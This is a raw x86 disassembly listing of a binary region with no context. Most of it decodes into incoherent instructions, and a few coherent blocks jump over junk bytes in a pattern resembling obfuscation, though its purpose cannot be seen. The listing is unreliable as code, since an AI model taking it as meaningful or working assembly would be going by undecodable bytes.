  4064db:	cmp    edi,DWORD PTR [edx+ebx*1]
  4064de:	inc    ecx
  4064df:	jecxz  0x406556
  4064e1:	idiv   ch
  4064e3:	xor    cl,BYTE PTR [edi+0x43b903b7]
  4064e9:	mov    esp,0x31345d14
  4064ee:	push   0xffffffd4
  4064f0:	outs   dx,BYTE PTR ds:[esi]
  4064f1:	stos   DWORD PTR es:[edi],eax
  4064f2:	ss cdq 
  4064f4:	and    al,0x85
  4064f6:	cdq    
  4064f7:	sub    eax,0x8ac20ba0
  4064fc:	or     al,0x8
  4064fe:	mov    eax,DWORD PTR [ebp-0x34]
  406501:	xor    BYTE PTR [eax],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi-0x436c9d84],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	icebp  
  406557:	ss push es
  406559:	fbstp  TBYTE PTR [ecx]
  40655b:	jecxz  0x40656f
  40655d:	call   0x591a3f55
  406562:	dec    DWORD PTR [esi-0x4db53e5]
  406568:	push   edx
  406569:	adc    al,0x27
  40656b:	mov    DWORD PTR [ecx+0x63],ebx
  40656e:	outs   dx,DWORD PTR ds:[esi]
  40656f:	pop    edi
  406570:	jmp    0xdcab:0x98f70b7f
  406577:	je     0x4065a6
  406579:	xor    DWORD PTR [ebx],0x2f
  40657c:	or     edi,DWORD PTR es:[esi]
  40657f:	and    cl,ah
  406581:	pop    ds
  406582:	sahf   
  406583:	push   ss
  406584:	xchg   ebp,eax
  406585:	jnp    0x406542
  406587:	cmp    dl,bh
  406589:	fstp   DWORD PTR [ecx-0x6b]
  40658c:	ins    DWORD PTR es:[edi],dx
  40658d:	xchg   esp,eax
  40658e:	dec    ecx
  40658f:	sar    DWORD PTR [edx],0x6
  406592:	fimul  DWORD PTR [ecx+0x2a52ca3f]
  406598:	or     al,0x1c
  40659a:	push   ebx
  40659b:	push   0x2c92e611
  4065a0:	scas   eax,DWORD PTR es:[edi]
  4065a1:	ins    BYTE PTR es:[edi],dx
  4065a2:	sbb    eax,0x40d3b9ab
  4065a7:	stos   DWORD PTR es:[edi],eax
  4065a8:	dec    ebx
  4065a9:	pop    ebp
  4065aa:	cmp    eax,0xb46fad8a
  4065af:	cmp    BYTE PTR [edi+0x21a60c48],0x1f
  4065b6:	inc    edx
  4065b7:	cmp    al,dh
  4065b9:	jns    0x4065df
  4065bb:	out    dx,eax
  4065bc:	stos   DWORD PTR es:[edi],eax
  4065bd:	sub    al,0x98
  4065bf:	cdq    
  4065c0:	jle    0x406572
  4065c2:	sub    edi,DWORD PTR [edi-0x69]
  4065c5:	add    ecx,esi
  4065c7:	cwde   
  4065c8:	sub    eax,0x91ab5f12
  4065cd:	shl    BYTE PTR [ecx-0x57],1
  4065d0:	aad    0xc6
  4065d2:	scas   al,BYTE PTR es:[edi]
  4065d3:	pop    es
  4065d4:	pusha  
  4065d5:	icebp  
  4065d6:	imul   ebp,esp,0xd8a32290
  4065dc:	xchg   dl,bl
  4065de:	in     al,0xc1
  4065e0:	xor    DWORD PTR [edx+0x3a],eax
  4065e3:	stc    
  4065e4:	fbstp  TBYTE PTR [ecx]
  4065e6:	ror    DWORD PTR [edi+0x3f],1
  4065e9:	ja     0x4065a3
  4065eb:	(bad)  
  4065ec:	jg     0x406660
  4065ee:	fs dec esp
  4065f0:	mov    ss,ecx
  4065f2:	xor    esi,esi
  4065f4:	std    
  4065f5:	add    edi,DWORD PTR [ecx+0x40]
  4065f8:	daa    
  4065f9:	add    ebp,eax
  4065fb:	mov    al,ds:0xfc7c29fa
  406600:	mov    fs,WORD PTR ds:0x1149b6ac
  406606:	jmp    0xe21630cd
  40660b:	or     esi,0x3c
  40660e:	jle    0x406657
  406610:	jmp    DWORD PTR [ebx-0x1f205282]
  406616:	aad    0xed
  406618:	mov    edi,0xe9a32e96
  40661d:	(bad)  
  40661e:	call   0xa6219f1f
  406623:	dec    esp
  406624:	push   0x52
  406626:	lods   al,BYTE PTR ds:[esi]
  406627:	jge    0x40662d
  406629:	fst    DWORD PTR [ebx]
  40662c:	push   ebx
  40662d:	push   eax
  40662e:	adc    eax,0xb01bf7af
  406633:	inc    ebx
  406634:	aaa    
  406635:	test   bh,bl
  406637:	rcr    BYTE PTR gs:[edi],cl
  40663a:	and    eax,0x1d77b0ed
  40663f:	add    esi,DWORD PTR [edx]
  406641:	aad    0xb9
  406643:	push   edi
  406644:	inc    edi
  406645:	ins    DWORD PTR es:[edi],dx
  406646:	or     al,0xed
  406648:	cmp    eax,0x4c28c029
  40664d:	jb     0x4066c9
  40664f:	loopne 0x4066af
  406651:	add    al,ah
  406653:	jne    0x4066ba
  406655:	jno    0x406668
  406657:	ins    BYTE PTR es:[edi],dx
  406658:	gs mov edx,0x99fd1446
  40665e:	sbb    al,0x39
  406660:	inc    ecx
  406661:	pop    eax
  406662:	repz add DWORD PTR [ebx-0x790eeadb],ecx
  406669:	push   0xa
  40666b:	jbe    0x4066cf
  40666d:	or     DWORD PTR [edi-0x9],esi
  406670:	les    edx,FWORD PTR [esi-0x43]
  406673:	test   eax,0x1090894a
  406678:	not    DWORD PTR [eax]
  40667a:	dec    ebp
  40667b:	and    eax,0xa087dc4a
  406680:	mov    ds:0x42f0945c,al
  406685:	mov    esp,0x21027a93
  40668a:	pop    esp
  40668b:	push   cs
  40668c:	(bad)  
  40668d:	cmp    al,0xf
  40668f:	mov    ah,0x46
  406691:	pop    es
  406692:	jmp    0x58f783fa
  406697:	scas   eax,DWORD PTR es:[edi]
  406698:	jb     0x4066b1
  40669a:	push   ebp
  40669b:	loope  0x406698
  40669d:	mov    eax,DWORD PTR [edi+0x781c8a40]
  4066a3:	jae    0x40664b
  4066a5:	arpl   si,sp
  4066a7:	mov    ah,0x84
  4066a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066aa:	jmp    0x40663f
  4066ac:	mov    bl,BYTE PTR [esi+0x51]
  4066af:	jne    0x4066ad
  4066b1:	pop    ebp
  4066b2:	push   0xffffffba
  4066b4:	cmp    eax,0x92c4c4fb
  4066b9:	xor    DWORD PTR [ecx],ecx
  4066bb:	shl    DWORD PTR [edx],0x10
  4066be:	cli    
  4066bf:	cs clc 
  4066c1:	cmc    
  4066c2:	lock xor esi,DWORD PTR [edi+0x46c6ad80]
  4066c9:	jge    0x4066e5
  4066cb:	pop    esi
  4066cc:	mov    bh,0x5d
  4066ce:	xor    DWORD PTR [edi-0x2d],ebx
  4066d1:	and    al,0xf
  4066d3:	mov    esp,0x173afeb3
  4066d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066d9:	aas    
  4066da:	pop    DWORD PTR [edi]
  4066dc:	ja     0x4066a6
  4066de:	scas   eax,DWORD PTR es:[edi]
  4066df:	xor    bh,BYTE PTR [edx-0x32]
  4066e2:	int    0xa8
  4066e4:	loopne 0x4066b9
  4066e6:	or     al,0x7d
  4066e8:	(bad)  
  4066e9:	jbe    0x406671
  4066eb:	dec    esi
  4066ec:	dec    bp
  4066ee:	inc    edx
  4066ef:	stos   DWORD PTR es:[edi],eax
  4066f0:	push   ds
  4066f1:	dec    edi
  4066f2:	mov    esi,esi
  4066f4:	pushf  
  4066f5:	mul    DWORD PTR [esi+0x5bc4c2d]
  4066fb:	xor    bh,al
  4066fd:	jle    0x406727
  4066ff:	jge    0x406715
  406701:	clc    
  406702:	fmul   QWORD PTR [ecx]
  406704:	ins    DWORD PTR es:[edi],dx
  406705:	push   esi
  406706:	mov    edi,0xb88a7a72
  40670b:	jbe    0x4066f8
  40670d:	fcomp  QWORD PTR [ecx]
  40670f:	add    al,0xba
  406711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406712:	mov    cs,ebx
  406714:	pop    edi
  406715:	dec    ecx
  406716:	pop    ds
  406717:	ret    
  406718:	fs cs jno 0x40670b
  40671c:	jle    0x4066e3
  40671e:	and    eax,DWORD PTR [ebp-0x4f]
  406721:	sbb    esp,DWORD PTR [edi]
  406723:	aad    0x81
  406725:	shl    DWORD PTR [eax-0x30905bcf],cl
  40672b:	shl    BYTE PTR [esi+0x70],0x6f
  40672f:	popa   
  406730:	pop    es
  406731:	push   cs
  406732:	xlat   BYTE PTR ds:[ebx]
  406733:	add    eax,0x257c69d4
  406738:	and    esi,DWORD PTR [ebp+ebp*4+0xdea515a]
  40673f:	mov    eax,0x72bb94b4
  406744:	push   ecx
  406745:	xchg   esp,eax
  406746:	daa    
  406747:	aaa    
  406748:	sbb    DWORD PTR [edi-0x57],0x47
  40674c:	xor    bl,BYTE PTR [ecx+0x7d]
  40674f:	pop    esi
  406750:	inc    edi
  406751:	mov    ebx,0x216f21c6
  406756:	jle    0x406754
  406758:	int3   
  406759:	sbb    ecx,DWORD PTR [ecx+0x68b1c2fe]
  40675f:	shl    BYTE PTR [edx-0x80],cl
  406762:	pop    ebx
  406763:	xlat   BYTE PTR ds:[ebx]
  406764:	pop    ds
  406765:	xchg   edi,eax
  406766:	sbb    eax,ebp
  406768:	xor    ch,bl
  40676a:	ins    BYTE PTR es:[edi],dx
  40676b:	cmc    
  40676c:	fnstenv [ecx]
  40676e:	stos   DWORD PTR es:[edi],eax
  40676f:	push   ecx
  406770:	push   es
  406771:	dec    ecx
  406772:	dec    ecx
  406773:	out    dx,eax
  406774:	pop    eax
  406775:	dec    esi
  406776:	retf   0x7374
  406779:	or     DWORD PTR [eax],ecx
  40677b:	mov    cl,0x41
  40677d:	aas    
  40677e:	inc    edi
  40677f:	icebp  
  406780:	int3   
  406781:	xor    edx,DWORD PTR [esi+ebx*4]
  406784:	int3   
  406785:	mov    eax,0x1c877e57
  40678a:	(bad)  
  40678b:	in     al,dx
  40678c:	in     eax,0x2a
  40678e:	mov    bh,BYTE PTR [esi-0x7a]
  406791:	xchg   DWORD PTR [edx-0x22],edi
  406794:	test   DWORD PTR [ecx],0xa0c414ba
  40679a:	rcl    BYTE PTR ds:0x6cfb39dd,0x29
  4067a1:	into   
  4067a2:	inc    edi
  4067a3:	xor    ecx,0xd5d414e8
  4067a9:	arpl   WORD PTR [ebp+0x26],ax
  4067ac:	cwde   
  4067ad:	cmc    
  4067ae:	push   cs
  4067af:	mov    ecx,0xe089a181
  4067b4:	add    al,ah
  4067b6:	adc    eax,0xdb06a02d
  4067bb:	pop    esp
  4067bc:	les    ebx,FWORD PTR [ecx]
  4067be:	enter  0x75be,0x2f
  4067c2:	out    dx,eax
  4067c3:	xlat   BYTE PTR ds:[ebx]
  4067c4:	jmp    0x406819
  4067c6:	or     bh,BYTE PTR [edx-0x2a]
  4067c9:	cs scas al,BYTE PTR es:[edi]
  4067cb:	sbb    DWORD PTR [ecx-0x4b],edi
  4067ce:	mov    ds:0xfbe65fa8,eax
  4067d3:	adc    cl,BYTE PTR [ebx]
  4067d5:	leave  
  4067d6:	mov    eax,ds:0x7e1ce2b9
  4067db:	sahf   
  4067dc:	aam    0x72
  4067de:	shl    dl,0x21
  4067e1:	sbb    al,0xa6
  4067e3:	mov    fs,WORD PTR [ecx-0x46350335]
  4067e9:	pop    edi
  4067ea:	sub    ch,0xe
  4067ed:	lahf   
  4067ee:	cdq    
  4067ef:	mov    bh,0x7b
  4067f1:	add    DWORD PTR [ebx],esi
  4067f3:	xchg   esp,eax
  4067f4:	shr    bh,1
  4067f6:	add    ah,BYTE PTR [eax+0x2a]
  4067f9:	and    ecx,ebx
  4067fb:	and    al,0xf5
  4067fd:	jmp    0x4067c1
  4067ff:	pop    ss
  406800:	and    BYTE PTR [esp+edi*2-0x4469584d],ch
  406807:	dec    ebp
  406808:	aaa    
  406809:	mov    edi,0xa8f17a05
  40680e:	out    dx,eax
  40680f:	in     eax,dx
  406810:	dec    edx
  406811:	mov    edi,?
  406813:	pop    esp
  406814:	sbb    ebp,DWORD PTR [eax-0x6fe12eef]
  40681a:	lock sbb edi,DWORD PTR [edx]
  40681d:	out    0xa0,eax
  40681f:	dec    ecx
  406820:	dec    esi
  406821:	jns    0x40685a
  406823:	pushf  
  406824:	inc    ebp
  406825:	gs ret 
  406827:	or     al,0xbe
  406829:	or     DWORD PTR [edx+0x67],0x58
  40682d:	pop    ebp
  40682e:	ss push sp
  406831:	xor    al,0x12
  406833:	lods   al,BYTE PTR ds:[esi]
  406834:	xchg   ebp,eax
  406835:	gs pop edi
  406837:	add    ebp,esp
  406839:	sbb    al,dl
  40683b:	(bad)  
  40683c:	iret   
  40683d:	mov    esp,0x6e0fa360
  406842:	hlt    
  406843:	and    DWORD PTR ds:0xec253c56,esi
  406849:	xchg   edx,eax
  40684a:	xchg   edi,eax
  40684b:	cmp    BYTE PTR [edx+0x17],dl
  40684e:	call   0x86a7eed2
  406853:	and    al,0xad
  406855:	and    BYTE PTR [edx+0x31],al
  406858:	retf   
  406859:	rol    DWORD PTR [edi+ebp*8],0x30
  40685d:	std    
  40685e:	(bad)  [esi]
  406860:	xor    al,BYTE PTR [esi+0x3]
  406863:	sub    al,0x15
  406865:	call   0xe03:0xacd4b3d1
  40686c:	cmp    DWORD PTR [edx+ebx*1+0xfc9a267],0x24
  406874:	push   esi
  406875:	dec    edi
  406876:	and    BYTE PTR [ebp-0x12],cl
  406879:	aaa    
  40687a:	ins    BYTE PTR es:[edi],dx
  40687b:	mov    BYTE PTR ds:0x740efaba,dl
  406881:	adc    esp,DWORD PTR [edi]
  406883:	les    ecx,FWORD PTR [ecx-0x20]
  406886:	es es inc eax
  406889:	xlat   BYTE PTR ds:[ebx]
  40688a:	mov    ebx,ds
  40688c:	out    0x6e,eax
  40688e:	fwait
  40688f:	not    DWORD PTR [ebp+0x5907df92]
  406895:	and    DWORD PTR [eax],eax
  406897:	imul   ecx,DWORD PTR ds:0x33e49d88,0x88538fcd
  4068a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068a2:	sbb    eax,0x108c495
  4068a7:	and    bl,BYTE PTR [ebp+0x327ab70f]
  4068ad:	adc    DWORD PTR [esi-0x7],esp
  4068b0:	clc    
  4068b1:	into   
  4068b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068b3:	jmp    0x843f:0x6cbdae22
  4068ba:	into   
  4068bb:	mov    dl,BYTE PTR [edi+0x612ec340]
  4068c1:	imul   ebp,DWORD PTR [edi-0x67],0xffffffaa
  4068c5:	jno    0x406883
  4068c7:	dec    esi
  4068c8:	cmp    al,0xff
  4068ca:	outs   dx,DWORD PTR ds:[esi]
  4068cb:	cmp    bh,BYTE PTR [ecx+ebp*4]
  4068ce:	repz xchg edx,eax
  4068d0:	sbb    al,0xa7
  4068d2:	into   
  4068d3:	cmp    dl,ah
  4068d5:	inc    ecx
  4068d6:	add    eax,DWORD PTR [ecx-0x16]
  4068d9:	dec    esi
  4068da:	xlat   BYTE PTR ds:[ebx]
  4068db:	not    DWORD PTR [ebp-0x6f4fe1ae]
  4068e1:	or     eax,0x3ec058d2
  4068e6:	rol    BYTE PTR [edx+0x3528c379],1
  4068ec:	sbb    DWORD PTR [eax+0x47],esi
  4068ef:	rcl    DWORD PTR [esi+0x27],1
  4068f2:	retf   
  4068f3:	out    0xe5,eax
  4068f5:	add    cl,BYTE PTR [edx]
  4068f7:	ja     0x4068b6
  4068f9:	jbe    0x4068ab
  4068fb:	popa   
  4068fc:	mov    al,ds:0xf35b775
  406901:	sbb    BYTE PTR [edi+0x8],al
  406904:	jg     0x406900
  406906:	cmp    BYTE PTR ds:0xd7475cc0,al
  40690c:	adc    edx,ecx
  40690e:	sbb    eax,0x95c886e4
  406913:	and    eax,0xc140f941
  406918:	loope  0x406938
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0xb0bf78b1
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	and    DWORD PTR [esi+esi*4+0x31],ebx
  406984:	jns    0x4069dc
  406986:	sub    eax,0xffac4ae0
  40698b:	data16 int3 
  40698d:	popa   
  40698e:	shl    BYTE PTR [edx],0x82
  406991:	jg     0x406954
  406993:	jmp    0x2e88fa7a
  406998:	(bad)  
  406999:	dec    edi
  40699a:	cs push ecx
  40699c:	dec    ebp
  40699d:	ss xor al,0x9a
  4069a0:	jecxz  0x406a14
  4069a2:	mul    al
  4069a4:	xlat   BYTE PTR ds:[ebx]
  4069a5:	in     eax,0x72
  4069a7:	mov    ds:0x771d301d,eax
  4069ac:	mov    esp,0xc8024f2c
  4069b1:	js     0x40695c
  4069b3:	cmp    BYTE PTR [ebp+0x8],al
  4069b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069b7:	stos   DWORD PTR es:[edi],eax
  4069b8:	stos   DWORD PTR es:[edi],eax
  4069b9:	pop    ebp
  4069ba:	lea    esi,[edx]
  4069bc:	sbb    DWORD PTR [ecx+0x74],edi
  4069bf:	and    al,dh
  4069c1:	adc    ch,dh
  4069c3:	mov    al,ds:0x91205b21
  4069c8:	or     eax,ecx
  4069ca:	cmc    
  4069cb:	mov    esi,0xd167263a
  4069d0:	jbe    0x4069a8
  4069d2:	stc    
  4069d3:	sbb    BYTE PTR [esi],bl
  4069d5:	push   ebp
  4069d6:	mov    ch,0xc7
  4069d8:	lods   al,BYTE PTR ds:[esi]
  4069d9:	rol    BYTE PTR [ebx-0x3473967a],0x4c
  4069e0:	popf   
  4069e1:	imul   eax,DWORD PTR [edx+ecx*2-0x2cfcf817],0xffffffb0
  4069e9:	cld    
  4069ea:	mov    bl,0x12
  4069ec:	test   DWORD PTR ds:0x71806a3,ebp
  4069f2:	ret    
  4069f3:	sub    BYTE PTR [ebx+0x78cffe39],dh
  4069f9:	leave  
  4069fa:	push   ds
  4069fb:	dec    edx
  4069fc:	xchg   ecx,eax
  4069fd:	jb     0x406a03
  4069ff:	cmp    BYTE PTR [edx-0x4b6f6031],dl
  406a05:	loope  0x4069d0
  406a07:	pop    ds
  406a08:	jne    0x406a10
  406a0a:	and    eax,0x6f9cd635
  406a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a10:	je     0x406a34
  406a12:	mov    ch,0xf6
  406a14:	jmp    0xd8221664
  406a19:	dec    eax
  406a1a:	shl    BYTE PTR [ebx],0xde
  406a1d:	jae    0x406a57
  406a1f:	addr16 pop ebp
  406a21:	aaa    
  406a22:	aad    0x9b
  406a24:	not    BYTE PTR [esi]
  406a26:	dec    esp
  406a27:	aad    0x2b
  406a29:	mov    ds:0xeb7575b2,al
  406a2e:	and    BYTE PTR [esi],bl
  406a30:	addr16 clc 
  406a32:	xchg   ebx,eax
  406a33:	xor    al,0xc8
  406a35:	xchg   BYTE PTR [ebx+0x14e09b9b],al
  406a3b:	ret    
  406a3c:	mov    ds:0x30274790,eax
  406a41:	das    
  406a42:	add    BYTE PTR [edi+0x40],ch
  406a45:	push   es
  406a46:	pusha  
  406a47:	or     esi,ecx
  406a49:	mov    BYTE PTR [ebp-0x6c],0xa8
  406a4d:	dec    edi
  406a4e:	pop    ecx
  406a4f:	out    dx,eax
  406a50:	in     eax,0x34
  406a52:	mov    bl,0x36
  406a55:	int    0x2d
  406a57:	add    DWORD PTR [ecx],eax
  406a59:	nop
  406a5a:	jne    0x406acf
  406a5c:	cmp    esi,DWORD PTR [eax-0x47]
  406a5f:	adc    BYTE PTR [ecx+0x13197245],0xc2
  406a66:	xchg   ecx,eax
  406a67:	cmp    eax,0x46aea745
  406a6c:	retf   0x287d
  406a6f:	mov    cl,0x8c
  406a71:	adc    al,0x74
  406a73:	leave  
  406a74:	sub    ch,BYTE PTR [esi+0x1f]
  406a77:	inc    eax
  406a78:	mov    ch,0x87
  406a7a:	dec    BYTE PTR [edi-0x1b]
  406a7d:	adc    BYTE PTR [ecx+ebx*4],0xe
  406a81:	ficom  WORD PTR [edx-0xbe0d997]
  406a87:	or     al,0xb2
  406a89:	mov    gs,esp
  406a8b:	push   ds
  406a8c:	jae    0x406a96
  406a8e:	and    BYTE PTR [edx],cl
  406a90:	jp     0x406a6d
  406a92:	test   DWORD PTR [ebx+edi*1+0x7d939ccf],esp
  406a99:	not    ah
  406a9b:	xchg   esp,eax
  406a9c:	sub    bl,al
  406a9e:	jmp    0x1be85860
  406aa3:	daa    
  406aa4:	hlt    
  406aa5:	lock push ds
  406aa7:	stos   DWORD PTR es:[edi],eax
  406aa8:	and    eax,0x3ce05057
  406aad:	jbe    0x406a81
  406aaf:	aas    
  406ab0:	add    ecx,DWORD PTR [edi-0xaf363b]
  406ab6:	std    
  406ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ab8:	sub    ebp,ecx
  406aba:	outs   dx,BYTE PTR ds:[esi]
  406abb:	push   ds
  406abc:	sub    DWORD PTR [ecx-0x1c],ebx
  406abf:	sub    ebx,ecx
  406ac1:	mov    ebp,fs
  406ac3:	into   
  406ac4:	cmp    BYTE PTR [edi],al
  406ac6:	scas   al,BYTE PTR es:[edi]
  406ac7:	je     0x406a7e
  406ac9:	inc    ebp
  406aca:	test   al,0x71
  406acc:	jmp    0x32f90a01
  406ad1:	out    dx,eax
  406ad2:	shl    BYTE PTR [esi-0x45e21527],cl
  406ad8:	call   0x40e6:0xa18c196f
  406adf:	inc    edi
  406ae0:	adc    eax,0x70d8455c
  406ae5:	xor    BYTE PTR [ecx],ah
  406ae7:	icebp  
  406ae8:	ds add eax,0x4d22c5a0
  406aee:	mov    bh,0x61
  406af0:	or     al,BYTE PTR [ebx+0x4a0f4e83]
  406af6:	lahf   
  406af7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406af8:	mov    esi,0xb50b1f1c
  406afd:	mov    esp,0x73e22008
  406b02:	push   edx
  406b03:	cld    
  406b04:	leave  
  406b05:	inc    esi
  406b06:	loope  0x406ad4
  406b08:	inc    ebp
  406b09:	push   cs
  406b0a:	xor    DWORD PTR [eax-0x6f],0xffffffe4
  406b0e:	cld    
  406b0f:	add    DWORD PTR ds:0xfb733247,ecx
  406b15:	mov    ecx,0xb879bbf4
  406b1a:	call   0x3ca1:0x81ca00f4
  406b21:	(bad)  [ebp+0x3aaa7add]
  406b27:	lods   eax,DWORD PTR ds:[esi]
  406b28:	data16 adc al,0xe
  406b2b:	cmp    ecx,DWORD PTR [ebx]
  406b2d:	mov    ebp,0x4827c018
  406b32:	into   
  406b33:	loopne 0x406ab9
  406b35:	out    0xf4,eax
  406b37:	sahf   
  406b38:	xchg   ecx,eax
  406b39:	shl    DWORD PTR [edx-0x6e],1
  406b3c:	dec    ecx
  406b3d:	sub    DWORD PTR [esi],eax
  406b3f:	pusha  
  406b40:	ds ret 
  406b42:	jmp    0x2776:0x971c0ec2
  406b49:	pop    es
  406b4a:	test   BYTE PTR [edx],bh
  406b4c:	push   0x6154fe2f
  406b51:	cmp    ebx,ecx
  406b53:	pushf  
  406b54:	mov    esp,?
  406b56:	repnz out dx,al
  406b58:	and    bl,BYTE PTR [ecx-0x4]
  406b5b:	ror    BYTE PTR [ebx+edi*4+0x69],cl
  406b5f:	and    BYTE PTR [edx],ch
  406b61:	ret    0x19f8
  406b64:	test   eax,0xe870fe74
  406b69:	into   
  406b6a:	dec    esi
  406b6b:	xchg   esi,eax
  406b6c:	mov    ebx,0x67063ac9
  406b71:	jecxz  0x406b1e
  406b73:	cmp    eax,0xb2b89991
  406b78:	inc    ebp
  406b79:	or     al,0xfe
  406b7b:	mov    eax,ds:0xe40d9815
  406b80:	sub    ah,BYTE PTR [edi+eax*1+0x6c8ec4e]
  406b87:	push   ebx
  406b88:	cmp    ecx,DWORD PTR [ebx+eax*8-0x32]
  406b8c:	pop    es
  406b8d:	mov    eax,ds:0x7ceafcdc
  406b92:	inc    edx
  406b93:	dec    esp
  406b94:	loopne 0x406c0b
  406b96:	add    ebp,DWORD PTR [ecx-0x1f]
  406b99:	mov    dh,0xf7
  406b9b:	cmc    
  406b9c:	dec    esi
  406b9d:	icebp  
  406b9e:	inc    ebx
  406b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ba0:	add    BYTE PTR [edx+0x5b4da11f],cl
  406ba6:	retf   
  406ba7:	or     BYTE PTR [ebp+0x12],ah
  406baa:	daa    
  406bab:	sbb    esp,edi
  406bad:	out    0x81,al
  406baf:	outs   dx,BYTE PTR ds:[esi]
  406bb0:	or     BYTE PTR [eax-0x6a],dh
  406bb3:	les    eax,FWORD PTR ds:0x259541f9
  406bb9:	(bad)  
  406bba:	(bad)  
  406bbb:	cwde   
  406bbc:	popf   
  406bbd:	ficom  WORD PTR [eax]
  406bbf:	mov    dh,0x2e
  406bc1:	(bad)  
  406bc2:	rcr    DWORD PTR [ecx-0x4a403190],1
  406bc8:	mov    esi,0x3a977dbc
  406bcd:	(bad)
  406bd0:	mov    ch,0xdd
  406bd2:	loope  0x406c16
  406bd4:	sbb    dh,dl
  406bd6:	cmp    eax,0x6387cb24
  406bdb:	mov    eax,ds:0xff183bda
  406be0:	mov    ah,0x11
  406be2:	pusha  
  406be3:	and    DWORD PTR [ecx+0x3f931b66],edx
  406be9:	dec    edi
  406bea:	mov    DWORD PTR [ebx+0x2d],eax
  406bed:	daa    
  406bee:	jae    0x406b8a
  406bf0:	inc    edi
  406bf1:	(bad)  
  406bf2:	xchg   ebx,eax
  406bf3:	fwait
  406bf4:	jae    0x406c52
  406bf6:	adc    BYTE PTR [ebx+ecx*4],dl
  406bf9:	mov    ecx,0xd18e9628
  406bfe:	cmc    
  406bff:	inc    edx
  406c00:	add    eax,0xc542ac
  406c05:	or     DWORD PTR [ebx+0x2800892f],ebx
  406c0b:	cli    
  406c0c:	xlat   BYTE PTR ds:[ebx]
  406c0d:	inc    ebp
  406c0e:	jbe    0x406c79
  406c10:	jl     0x406be4
  406c12:	jmp    0xcb05fe35
  406c17:	mov    dl,0x5
  406c19:	and    BYTE PTR [edi+0x3b],dl
  406c1c:	or     al,0xb1
  406c1e:	xchg   esp,eax
  406c1f:	cdq    
  406c20:	inc    edi
  406c21:	or     ah,BYTE PTR [ecx+eax*2]
  406c24:	lods   al,BYTE PTR ds:[esi]
  406c25:	clc    
  406c26:	inc    eax
  406c27:	mov    al,0x23
  406c29:	jge    0x406c31
  406c2b:	data16 lods al,BYTE PTR ds:[esi]
  406c2d:	das    
  406c2e:	and    dl,BYTE PTR [eax]
  406c30:	(bad)  
  406c31:	(bad)  
  406c32:	es jmp 0x90a2:0x48ba3896
  406c3a:	or     BYTE PTR [ecx+ecx*8-0x4f9fba42],dh
  406c41:	push   eax
  406c42:	clc    
  406c43:	div    BYTE PTR [esi+esi*8-0x57d38b54]
  406c4a:	outs   dx,BYTE PTR ds:[esi]
  406c4b:	push   cs
  406c4c:	jo     0x406ccd
  406c4e:	fnstcw WORD PTR [ebp+edi*1+0x69]
  406c52:	pop    ss
  406c53:	mov    bh,0xd3
  406c55:	inc    DWORD PTR [edi+0x6f]
  406c58:	adc    eax,0xc721b8d5
  406c5d:	fstp   TBYTE PTR [edi-0x63e26973]
  406c63:	and    BYTE PTR gs:[edx],0xec
  406c67:	adc    cl,cl
  406c69:	ins    BYTE PTR es:[edi],dx
  406c6a:	inc    edx
  406c6b:	mov    ah,0xe0
  406c6d:	fnstenv [ebx]
  406c6f:	and    bh,BYTE PTR [ebp+0x3f]
  406c72:	jmp    0x406c89
  406c74:	pop    esi
  406c75:	int    0x43
  406c77:	retf   0x71cb
  406c7a:	mov    bl,BYTE PTR [edi+0x3e336cbb]
